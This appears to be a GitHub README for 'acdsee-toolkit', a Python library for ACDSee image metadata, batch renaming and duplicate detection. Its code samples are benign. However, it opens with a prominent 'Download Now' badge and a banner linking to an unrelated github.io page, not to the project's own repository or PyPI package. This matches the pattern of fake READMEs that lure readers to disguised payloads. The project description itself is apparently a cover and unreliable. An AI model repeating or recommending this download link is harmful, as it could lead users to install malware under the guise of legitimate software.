# acdsee-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://chamthjayanaka.github.io/acdsee-info-mef/)


[![Banner](banner.png)](https://chamthjayanaka.github.io/acdsee-info-mef/)


[![PyPI version](https://badge.fury.io/py/acdsee-toolkit.svg)](https://badge.fury.io/py/acdsee-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build Status](https://img.shields.io/github/actions/workflow/status/acdsee-toolkit/acdsee-toolkit/ci.yml)](https://github.com/acdsee-toolkit/acdsee-toolkit)
[![Code Style: Black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating image management workflows, extracting metadata, and processing image libraries managed by ACDSee Free on Windows. Built for developers and power users who need programmatic control over their image collections.

---

## Overview

`acdsee-toolkit` provides a clean Python interface to automate repetitive image management tasks, parse ACDSee-generated metadata, and build data pipelines around lightweight image viewer workflows on Windows. Whether you manage thousands of photos or need to extract EXIF data at scale, this toolkit streamlines the process.

---

## Features

- 📁 **Catalog Scanning** — Recursively scan image directories and build structured file inventories compatible with ACDSee Free's file organization conventions
- 🏷️ **Metadata Extraction** — Read and parse EXIF, IPTC, and XMP metadata from JPEG, PNG, TIFF, and RAW image formats
- 🔄 **Batch Processing** — Automate bulk rename, resize, format conversion, and thumbnail generation workflows
- 📊 **Data Analysis** — Aggregate image statistics, generate reports on collection composition, and export to CSV or JSON
- 🗂️ **Category & Tag Management** — Read ACDSee-style category files and sidecar `.xmp` files for tag synchronization
- 🖼️ **Thumbnail Pipeline** — Programmatically generate and cache thumbnails for large image libraries
- 🔍 **Duplicate Detection** — Identify duplicate or near-duplicate images using perceptual hashing
- 🪟 **Windows Path Support** — Full support for Windows-style paths, network drives, and UNC paths common in ACDSee Free workflows

---

## Requirements

| Requirement | Version |
|---|---|
| Python | ≥ 3.8 |
| Pillow | ≥ 10.0.0 |
| piexif | ≥ 1.1.3 |
| python-xmp-toolkit | ≥ 2.0.1 |
| imagehash | ≥ 4.3.1 |
| pandas | ≥ 2.0.0 |
| click | ≥ 8.1.0 |
| rich | ≥ 13.0.0 |

> **Note:** This toolkit runs on any platform (Windows, macOS, Linux) but is optimized for workflows originating from ACDSee Free on Windows environments.

---

## Installation

### From PyPI

```bash
pip install acdsee-toolkit
```

### From Source

```bash
git clone https://github.com/acdsee-toolkit/acdsee-toolkit.git
cd acdsee-toolkit
pip install -e ".[dev]"
```

### With Optional Dependencies

```bash
# Include RAW image format support
pip install acdsee-toolkit[raw]

# Include full data analysis extras
pip install acdsee-toolkit[analysis]

# Install everything
pip install acdsee-toolkit[all]
```

---

## Quick Start

```python
from acdsee_toolkit import ImageLibrary

# Point the toolkit at your image directory
library = ImageLibrary(root_path="C:/Users/yourname/Pictures")

# Scan and build an inventory
inventory = library.scan()

print(f"Found {inventory.total_images} images across {inventory.total_folders} folders")
# Found 4,821 images across 312 folders

# Export the inventory to CSV
inventory.export("my_library.csv")
```

---

## Usage Examples

### Extract Metadata from an Image Batch

```python
from acdsee_toolkit import MetadataExtractor
from pathlib import Path

extractor = MetadataExtractor()

image_dir = Path("C:/Users/yourname/Pictures/Vacation2024")

for result in extractor.extract_batch(image_dir, extensions=[".jpg", ".jpeg", ".tiff"]):
    print(f"{result.filename}")
    print(f"  Camera:    {result.exif.get('Make')} {result.exif.get('Model')}")
    print(f"  Taken:     {result.exif.get('DateTimeOriginal')}")
    print(f"  Location:  {result.gps_coordinates}")
    print(f"  Tags:      {result.xmp_tags}")
```

**Output:**
```
IMG_4021.jpg
  Camera:    Canon EOS R6
  Taken:     2024-07-14 11:23:05
  Location:  (48.8566, 2.3522)
  Tags:      ['travel', 'paris', 'architecture']
```

---

### Batch Rename Using Metadata

```python
from acdsee_toolkit import BatchProcessor

processor = BatchProcessor(source_dir="C:/Users/yourname/Pictures/Raw")

# Rename files using EXIF date and camera model
processor.rename(
    pattern="{date:%Y-%m-%d}_{camera_model}_{index:04d}{ext}",
    dry_run=True  # Preview changes before applying
)

# Apply the rename operation
processor.rename(
    pattern="{date:%Y-%m-%d}_{camera_model}_{index:04d}{ext}",
    dry_run=False
)
```

---

### Parse ACDSee XMP Sidecar Files

ACDSee Free writes category and rating data into `.xmp` sidecar files. Use the toolkit to read and synchronize this data programmatically:

```python
from acdsee_toolkit.sidecar import XMPSidecarReader

reader = XMPSidecarReader()

sidecar = reader.parse("C:/Users/yourname/Pictures/IMG_4021.xmp")

print(f"Rating:     {sidecar.rating}/5")
print(f"Categories: {sidecar.categories}")
print(f"Keywords:   {sidecar.keywords}")
print(f"Label:      {sidecar.color_label}")

# Output:
# Rating:     4/5
# Categories: ['Family', 'Holidays/Summer']
# Keywords:   ['beach', 'sunset', 'candid']
# Label:      green
```

---

### Detect Duplicate Images

```python
from acdsee_toolkit.analysis import DuplicateFinder

finder = DuplicateFinder(hash_algorithm="phash", threshold=8)

duplicates = finder.scan("C:/Users/yourname/Pictures")

for group in duplicates.groups:
    print(f"\nDuplicate group ({len(group.files)} files):")
    for f in group.files:
        print(f"  {f.path} — {f.size_kb:.1f} KB")

print(f"\nTotal duplicates found: {duplicates.total_duplicate_files}")
print(f"Reclaimable space:      {duplicates.reclaimable_mb:.1f} MB")
```

---

### Generate a Collection Report

```python
from acdsee_toolkit.analysis import LibraryAnalyzer
import pandas as pd

analyzer = LibraryAnalyzer("C:/Users/yourname/Pictures")
report = analyzer.generate_report()

# Summary statistics
print(report.summary())

# Export full report as a DataFrame
df: pd.DataFrame = report.to_dataframe()

# Find your most-used camera models
print(df.groupby("camera_model")["filename"].count().sort_values(ascending=False).head(5))
```

**Output:**
```
=== Library Report ===
Total images   : 4,821
Total size     : 18.4 GB
Date range     : 2018-03-11 → 2024-11-02
Formats        : JPEG (78%), PNG (14%), TIFF (8%)
Avg. resolution: 5472 x 3648 px

camera_model
Canon EOS R6        1,204
Sony A7 IV            987
iPhone 15 Pro         743
Fujifilm X-T5         612
Canon EOS 80D         401
```

---

### Command-Line Interface

`acdsee-toolkit` also ships with a CLI for quick operations without writing Python:

```bash
# Scan a directory and print a summary
acdsee-toolkit scan "C:/Users/yourname/Pictures" --format table

# Extract metadata and export to JSON
acdsee-toolkit metadata extract ./photos --output metadata.json

# Find duplicates
acdsee-toolkit duplicates scan ./photos --threshold 8 --export duplicates.csv

# Batch rename (dry run)
acdsee-toolkit rename ./photos --pattern "{date}_{index:04d}{ext}" --dry-run
```

---

## Project Structure

```
acdsee-toolkit/
├── acdsee_toolkit/
│   ├── __init__.py
│   ├── library.py          # ImageLibrary and Inventory classes
│   ├── metadata.py         # EXIF/IPTC/XMP extraction
│   ├── batch.py            # Batch processing and renaming
│   ├── sidecar.py          # ACDSee XMP sidecar parsing
│   ├── analysis/
│   │   ├── duplicates.py   # Perceptual hash duplicate detection
│   │   └── reports.py      # Library analytics and reporting
│   └── cli.py              # Click-based CLI entry point
├── tests/
├── docs/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome! Here is how to get started:

1. **Fork** the repository on GitHub
2. **Clone** your fork locally:
   ```bash
   git clone https://github.com/your-username/acdsee-toolkit.git
   ```
3. **Create a branch** for your feature or fix:
   ```bash
   git checkout -b feature/add-raw-format-support
   ```
4. **Install development dependencies:**
   ```bash
   pip install -e ".[dev]"
   pre-commit install
   ```
5. **Run the test suite** before submitting:
   ```bash
   pytest tests/ -v --cov=acdsee_toolkit
   ```
6. **Open a Pull Request** with a clear description of your changes

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for our code of conduct and detailed contribution guidelines.

---

## Roadmap

- [ ] SQLite-backed catalog persistence
- [ ] Integration with Windows thumbnail cache (`.db` files)
- [ ] GUI preview widget using `tkinter`
- [ ] Cloud export connectors (Google Photos, OneDrive)
- [ ] Plugin architecture for custom processors

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## Acknowledgements

- [Pillow](https://python-pillow.org/) for image processing
- [piexif](https://github.com/hMatoba/Piexif) for EXIF read/write support
- [imagehash](https://github.com/JohannesBuchner/imagehash) for perceptual hashing
- [rich](https://github.com/Textualize/rich) for terminal output formatting

---

*This is an independent open-source toolkit and is not affiliated with or endorsed by ACD Systems International Inc.*